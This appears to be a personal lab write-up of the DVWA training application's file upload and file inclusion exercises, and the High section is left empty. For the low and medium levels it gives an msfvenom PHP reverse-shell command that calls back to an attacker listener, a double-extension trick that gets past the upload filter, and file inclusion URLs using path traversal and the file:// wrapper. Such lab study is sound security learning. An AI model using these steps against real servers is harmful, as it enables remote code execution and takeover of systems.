## Low

- For low I tried meterpeter shell for php, both staged and unstaged, it didn't work but then I tried simple reverse_shell and it worked.
- `msfvenom -p php/reverse_php LHOST=192.168.0.111 LPORT=4444 -f raw > shell_2.php`
- I was able to upload the shell_2.php without any issue, and got it executed by a file inclusion vulnerability at 
	- `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell_2.php`


## Medium

- Since this time a .jpeg or .png extension was required, i renamed the same shell to `shell_2.php.jpeg`. And uploaded this bad boy.
- And since for medium level security file inclusion vulnerability has some security measures in place but it is still vulnerable to `file://` wrapper. I used that.
	- `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg`


## High
